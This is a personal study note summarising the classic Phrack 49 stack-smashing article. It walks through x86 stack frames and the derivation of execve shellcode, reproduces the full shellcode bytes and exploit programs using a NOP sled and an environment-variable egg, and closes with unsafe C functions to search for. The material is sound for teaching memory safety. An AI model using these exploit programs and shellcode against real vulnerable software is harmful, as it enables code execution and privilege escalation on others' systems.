---
tags:
  - Article
---
[Phrack Magazine](https://phrack.org/issues/49/14)

- on many C implementations it is possible to corrupt the execution stack by writing past the end of an array declared auto in a routine
	- code doing this is said to *smash the stack*
		- can cause the return from a routine to jump to a random address
- is a *buffer overflow vulnerability*
	- examples syslog, splitvt, sendmail 8.7.5
- paper assumes Intel x86 CPU with OS being Linux
- static variables are allocated at lode time on the data segment
- dynamic variables are allocated at run time on the stack
- we concern ourselves with the overflow of dynamic buffers (stack-based buffer overflows)
### Process Memory Organisation
- processes are divided into three regions
	- Text - fixed by the program, includes code and read-only data
		- writing here is a segmentation violation
	- Data - contains initialised and uninitialised data. Static variables
		- new memory is added between the data and stack segments if this needs to grow
	- Stack
		- the stack is needed for higher level languages which make use of functions. Functions disrupt the flow of control, hence need to be put onto the stack and have control returned after when pushed off the stack
		- also used to dynamically allocated the local variables used in functions, to pass parameters to the functions, and to return values from the function
![[Screenshot 2025-09-24 at 22.36.11.png|200]]
## The Stack Region
- contiguous block of memory containing data
- A register called the *stack pointer* (SP) points to the top of the stack
- the bottom of the stack is at a *fixed address*
- size dynamically adjusted at run time by the kernel
- stack consists of *stack frames*
	- contains the parameters to a function, its local variables, and the data necessary to recover the previous stack frame, including the value of the instruction pointer at the time of the function call
- depending on the implementation the stack will either grow down (towards lower memory addresses), or up. SP is also implementation dependent, can point to next free address after the stack or the last address on the stack
	- most implementations grow down
	- assume SP points to last address on stack
- *frame pointer* (FP) points to a fixed location within a frame (also called a local base pointer (LB)), many compilers use this second register for referencing both local variables and parameters as their distances from FP do not change with Pushes and Pops
- first thing a procedure must do when called is save the previous FP
	- then copies SP into FP to create new FP
	- advances SP to reserve space for the local variables
	- procedure epilogue cleans this up upon procedure exit
	- LINK and UNLINK or ENTER and LEAVE are used
```c
void function(int a, int b, int c) {
   char buffer1[5];
   char buffer2[10];
}

void main() {
  function(1,2,3);
}
```
```x86
; Call to function
pushl $3 ; Pushes the 3 arguments
pushl $2 ; Pushes the 3 arguments
pushl $1 ; Pushes the 3 arguments
call function ; push the instruction pointer (IP onto the stack)

; The Function
pushl %ebp ; pushes EBP (frame pointer) onto the stack
movl %esp,%ebp ; copies the current SP onto EBP, making it the new FP pointer
subl $20,%esp ; allocates space for the local variables by subtracting their size from SP
```
- memory can only be addressed in multiples of the word size
	- 5 byte buffer is really going to take 8 bytes (this is why SP is being subtracted by 20)

### Buffer overflow coding error
```c
void function(char *str) {
   char buffer[16];

   strcpy(buffer,str);
}

void main() {
  char large_string[256];
  int i;

  for( i = 0; i < 255; i++)
    large_string[i] = 'A';

  function(large_string);
}
```

- here `strcpy()` is coping the contents of `*str` into `buffer[]` until a null character is found on the string
	- problem is `buffer[]` is much smaller than `*str`
	- causes the segmentation violation when the function returns
- buffer overflow allows us to change the return address of a function
	- can change the flow of execution of the program
- you can figure out how far to skip by utilising *gdb* using this we can decide how much to add to the return address
![[Screenshot 2025-09-24 at 23.12.20.png|500]]
## Shell Code
- how we know how to modify the return address and the flow of execution we can decide what program to execute
	- typically want to spawn a shell, from here we can issue other commands as we wish
	- we place the code in the buffer we are overflowing, and overwrite the return address so it points back into the buffer
- write the code to spawn a shell in C
```c
#include <stdio.h>

void main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
```
- compile it to find out what it looks like in assembly and start up gdb (use `-static` flag otherwise the actual code for the system call will not be included)
```x86
Dump of assembler code for function main:
; procedure prelude. Saves old frame pointer, makes the current stack pointer the new frame pointer, leaves space for the local variables 
0x8000130 <main>:       pushl  %ebp
0x8000131 <main+1>:     movl   %esp,%ebp
0x8000133 <main+3>:     subl   $0x8,%esp

; copy address of the string"/bin/sh" into the first pointer of name[]
0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)

; copy the value NULL into the socond pointer of name[]
0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)


; actual call to execve starts here
; push the arguments to execve() in reverse order onto the stack
0x8000144 <main+20>:    pushl  $0x0

; load the address of name[] into the EAX register
0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax

; push the address of name[] onto the stack
0x8000149 <main+25>:    pushl  %eax

; load the address of the string "/bin/sh" into the EAX register
0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax

; push the address of the string "/bin/sh" onto the stack
0x800014d <main+29>:    pushl  %eax

; call the library procedure execve()
0x800014e <main+30>:    call   0x80002bc <__execve>
0x8000153 <main+35>:    addl   $0xc,%esp
0x8000156 <main+38>:    movl   %ebp,%esp
0x8000158 <main+40>:    popl   %ebp
0x8000159 <main+41>:    ret
End of assembler dump.
(gdb) disassemble __execve
Dump of assembler code for function __execve:

; the procedure prelude
0x80002bc <__execve>:   pushl  %ebp
0x80002bd <__execve+1>: movl   %esp,%ebp
0x80002bf <__execve+3>: pushl  %ebx

; copy 0xb onto the stack. The index into the syscall table. 11 is execve
0x80002c0 <__execve+4>: movl   $0xb,%eax

; copy the address of "/bin/sh" into EBX
0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx

; copy the address of name[] into ECX
0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx

; copy the address of the null pointer into %edx
0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx

; change into kernel mode
0x80002ce <__execve+18>:        int    $0x80
0x80002d0 <__execve+20>:        movl   %eax,%edx
0x80002d2 <__execve+22>:        testl  %edx,%edx
0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
0x80002d6 <__execve+26>:        negl   %edx
0x80002d8 <__execve+28>:        pushl  %edx
0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
0x80002de <__execve+34>:        popl   %edx
0x80002df <__execve+35>:        movl   %edx,(%eax)
0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
0x80002e6 <__execve+42>:        popl   %ebx
0x80002e7 <__execve+43>:        movl   %ebp,%esp
0x80002e9 <__execve+45>:        popl   %ebp
0x80002ea <__execve+46>:        ret
0x80002eb <__execve+47>:        nop
End of assembler dump.
```
- what we need to do
	1. have the null terminated string "/bin/sh" somewhere in memory
	2. have the address of the string "/bin/sh" somewhere in memory followed by a null long word
	3. copy 0xb into the EAX register
	4. copy the address of the address of the string "/bin/sh" into the EBX register
	5. copy the address of the string "/bin/sh" into the ECX register
	6. copy the address of the null long word into the EDX register
	7. execute the int $0x80 instruction
- we want it to exit cleanly is the execve syscall fails
	- we must add a exit syscall after the execve syscall
	- for this we use the same process 
	8. copy 0x1 into the EAX register
	9. copy 0x0 into the EBX register
	10. execute the int $0x80 instruction
```x86
movl   string_addr,string_addr_addr
movb   $0x0,null_byte_addr
movl   $0x0,null_addr
movl   $0xb,%eax
movl   string_addr,%ebx
leal   string_addr,%ecx
leal   null_string,%edx
int    $0x80
movl   $0x1, %eax
movl   $0x0, %ebx
int    $0x80
/bin/sh string goes here.
```

- we do not know where in memory space the code we want to exploit will be placed
	- a workaround is using `JMP`, and a `CALL` instruction
		- `JMP` and `CALL` can use IP relative addressing
		- can jump to an offset from the current IP without needing to know the exact address of where in memory we want to jump to
		- place `CALL` right before the "/bin/sh" and a `JMP` instruction to it
			- strings address will be pushed onto the stack as the return address when `CALL` is executed
			- all we need is to copy the return address into a register
- calculating the offsets from jump to call, call to popl, from the string address to the array, and from the string address to the null long word wen now have
```x86
jmp    0x26                     # 2 bytes
popl   %esi                     # 1 byte
movl   %esi,0x8(%esi)           # 3 bytes
movb   $0x0,0x7(%esi)		# 4 bytes
movl   $0x0,0xc(%esi)           # 7 bytes
movl   $0xb,%eax                # 5 bytes
movl   %esi,%ebx                # 2 bytes
leal   0x8(%esi),%ecx           # 3 bytes
leal   0xc(%esi),%edx           # 3 bytes
int    $0x80                    # 2 bytes
movl   $0x1, %eax		# 5 bytes
movl   $0x0, %ebx		# 5 bytes
int    $0x80			# 2 bytes
call   -0x2b                    # 5 bytes
.string \"/bin/sh\"		# 8 byte
```
- problem is code modifies itself, but most operating system mark code pages read-only
	- get around it by placing the code in the stack or data segment, and transfer control to it
		- place global array in the data segment. We need first a hex representation of the binary code
```c
void main() {
__asm__("
        jmp    0x2a                     # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        movl   $0x0, %ebx               # 5 bytes
        int    $0x80                    # 2 bytes
        call   -0x2f                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
");
}
```
- obstacle: most cases we'll be trying to overflow a character buffer. Any null bytes in our shellcode will be considered the end of the string and he copy will be terminated
	- there must be no null bytes in the shellcode for the exploit to work
![[Screenshot 2025-09-27 at 23.33.56.png|400]]
![[Screenshot 2025-09-27 at 23.35.14.png|500]]
## Writing an Exploit
```c
char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  strcpy(buffer,large_string);
}
```
- filled the array `large_string[]` with the address of `buffer[]`
- copy our shellcode into the beginning of the `large_string` string
- `strcpy()` will then copy `large_string` onto buffer without doing any bounds checking, and will overflow the return address, overwriting it with the address where our code is now located
- once we read the end of main and it tried to return it jumps to our code, and execs a shell
- problem with overflowing another program: figure out what address the buffer is and thus where our code will be
	- for every program the stack will start at the same address
	- by knowing where the stack starts we can try to guess where the buffer we are trying to overflow will be
- create a program that will print its stack pointer
```c
unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}
void main() {
  printf("0x%x\n", get_sp());
}
```
- we can create a program that takes as a parameter a buffer size, and an offset from its own stack pointer. (where we believe the buffer we want to overflow may live)
```c
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr += 4;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"EGG=",4);
  putenv(buff);
  system("/bin/bash");
}
```
- now we can try to guess what the buffer and offset should be
	- not efficient process. Trying to guess the offset even while knowing where the beginning of the stack lives is nearly impossible
	- can increase chances by padding the front of our overflow buffer with NOP instructions
		- Fill half the overflow with NOP then we will place our shellcode at the centre, and then follow it with the return addresses
		- if we are lucky and the return address points anywhere in the string of NOPs they will just get executed until they reach our code
```c
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"EGG=",4);
  putenv(buff);
  system("/bin/bash");
}
```
- a good selection for our buffer size is about 100 bytes more than the size of the buffer we are trying to overflow, this will place our code at the end of the buffer we are trying to overflow, giving a lot of space for the NOPs
## Small Buffer Overflows
- sometimes the buffer is too small for the shellcode to fit
- sometimes the number of NOPs you can pad the front of the string with is so small that the chances of guessing their address is minuscule
- to obtain a shell you need another techniques
	- this approach only works when you have access to the program's environment variables
	- place the shellcode in an environment variable, and then overflow the buffer with the address of this variable in memory
		- also increases your chances of the exploit working as you can make the environment variable holding the shell code as large as you want
	- environment variables are stored in the top of the stack when the program is started, any modification by `setenv()` are then allocated elsewhere
```c
#include <stdlib.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) bsize   = atoi(argv[1]);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);


  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(buff,"RET=",4);
  putenv(buff);
  system("/bin/bash");
}
```
- depending how much environment data the exploit program has compared with the program you are trying to exploit the guessed address may be to low or to high. Experiment both with positive and negative offsets
## Finding Buffer Overflows
- C library provides a number of functions for copying or appending strings, that perform no boundary checking
	- they include: `strcat()`, `strcpy()`, `sprintf()`, and `bsprintf()`
	- operate on null terminated strings, and do not check for overflow of the receiving string
	- `gets()` is a function that reads a line from `stdin` into a buffer until either a terminating newline or EOF
		- performs no checks for buffer overflows
	- `scanf()` family of functions can also be a problem if you are matching a sequence of non-white-space characters (`%s`), or matching a noon-empty sequence of characters from a specified set (`%[]`), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width
	- if the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good possibility that you might be able to exploit a buffer overflow
- while loop to read one character at a time into a buffer from `stdin` or some file until the end of line, end of file, or some other delimiter is reached
	- usually uses one of these functions: `getc()`, `fgetc()`, or `getchar()`
	- if there is no explicit checks for overflows in the while loop, such programs are easily exploited
- `grep(1)` is your friend